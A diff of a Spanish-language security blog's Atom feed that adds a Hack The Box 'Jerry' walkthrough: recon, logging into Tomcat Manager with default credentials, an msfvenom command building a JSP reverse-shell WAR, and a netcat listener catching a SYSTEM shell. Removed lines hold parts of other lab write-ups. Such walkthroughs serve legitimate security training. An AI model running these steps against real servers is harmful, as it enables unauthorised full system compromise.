@@ -1,4 +1,121 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-13T21:05:59-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Blunder</title><link href="http://localhost:4000/htb-blunder/" rel="alternate" type="text/html" title="Hack The Box Blunder" /><published>2022-03-13T00:00:00-06:00</published><updated>2022-03-13T00:00:00-06:00</updated><id>http://localhost:4000/htb-blunder</id><content type="html" xml:base="http://localhost:4000/htb-blunder/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blunder/banner-blunder.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-03-15T01:50:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Jerry</title><link href="http://localhost:4000/htb-jerry/" rel="alternate" type="text/html" title="Hack The Box Jerry" /><published>2022-03-15T00:00:00-06:00</published><updated>2022-03-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-jerry</id><content type="html" xml:base="http://localhost:4000/htb-jerry/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/banner-jerry.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;jerry&quot;&gt;Jerry&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.95.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.95
+PING 10.10.10.95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.95&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.95: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.95 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 137.931/137.931/137.931/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-13 21:14 CST
+Initiating SYN Stealth Scan at 21:14
+Scanning 10.10.10.95 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 8080/tcp on 10.10.10.95
+Completed SYN Stealth Scan at 21:15, 26.50s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
+Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Scanned at 2022-03-13 21:14:52 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
+Not shown: 65534 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT     STATE SERVICE    REASON
+8080/tcp open  http-proxy syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;26.58 seconds
+           Raw packets sent: 131088 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;836B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 115 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.95
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 8080
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p8080&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-13 21:16 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.95
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/7.0.88
+|_http-server-header: Apache-Coyote/1.1
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.72 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que se encuentra abierto el puerto 8080 y como siempre, antes de visualizar el contenido vía web, vamos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ver a lo que nos enfrentamos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.95:8080
+http://10.10.10.95:8080 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que nos enfrentamos antes un Apache Tomcat, lo cual lo validamos vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a ver si se puede acceder al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manager/html&lt;/code&gt; y hacer uso de las credenciales por defect &lt;strong&gt;tomcat : s3cret&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya nos encontramos dentro del Gestor de Aplicaciones Web de Tomcat, por lo tanto, ya debemos estar pensando en generar un archivo de extensión &lt;strong&gt;war&lt;/strong&gt; para subirlo y obtener acceso al sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.27 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell.war
+Payload size: 1103 bytes
+Final size of war file: 1103 bytes
+
+❯ ll
+.rw-r--r-- root root 1.1 KB Tue Mar 15 01:41:14 2022  shell.war
+❯ &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;shell.war /home/k4miyo/Descargas/Firefox/.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Subimos nuestro archivo al servidor:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos ponemos en escucha por el puerto 443 y ahora seleccionamos nuestro archivo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/jerry-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.95] 49192
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.3.9600]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2013 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;whoami
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pache-tomcat-7.0.88&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya hemos ingresado a la máquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Arbitrary_File_Upload" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Jerry en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Blunder</title><link href="http://localhost:4000/htb-blunder/" rel="alternate" type="text/html" title="Hack The Box Blunder" /><published>2022-03-13T00:00:00-06:00</published><updated>2022-03-13T00:00:00-06:00</updated><id>http://localhost:4000/htb-blunder</id><content type="html" xml:base="http://localhost:4000/htb-blunder/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blunder/banner-blunder.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;blunder&quot;&gt;Blunder&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.191.&lt;/p&gt;
@@ -4164,682 +4281,4 @@ Info: Establishing connection to remote endpoint
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Powershell" /><category term="Kerberoasting" /><summary type="html">Resolución de la máquina Sauna en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Book</title><link href="http://localhost:4000/htb-book/" rel="alternate" type="text/html" title="Hack The Box Book" /><published>2022-01-28T00:00:00-06:00</published><updated>2022-01-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-book</id><content type="html" xml:base="http://localhost:4000/htb-book/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/banner-book.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;book&quot;&gt;Book&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.176.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.176
-PING 10.10.10.176 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.176&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.176: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;141 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.176 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 140.520/140.520/140.520/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.176 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-23 16:18 CST
-Initiating Ping Scan at 16:18
-Scanning 10.10.10.176 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 16:18, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 16:18
-Scanning 10.10.10.176 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 80/tcp on 10.10.10.176
-Discovered open port 22/tcp on 10.10.10.176
-Completed SYN Stealth Scan at 16:19, 36.12s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.176
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT   STATE SERVICE
-22/tcp open  ssh
-80/tcp open  http
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;36.42 seconds
-           Raw packets sent: 68980 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.035MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 68908 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.756MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯  extractPorts allPorts
-───────┬─────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.176
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.176 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-23 16:21 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.176
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
-|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: LIBRARY - Read | Learn | Have Fun
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;12.36 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos el puerto 80 abierto, por lo que antes de ver el contenido vía web, vamos a ver a lo que nos enfrentamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.176/
-http://10.10.10.176/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.176], PasswordField[password], Script, Title[LIBRARY - Read | Learn | Have Fun]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante, así que ahora si vamos vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos encontramos con un panel de login y vemos también la posiblidad de registrarnos; asi que antes de intentar algo, vamos a registrarnos y ver a lo que tenemos acceso.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-book/book-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
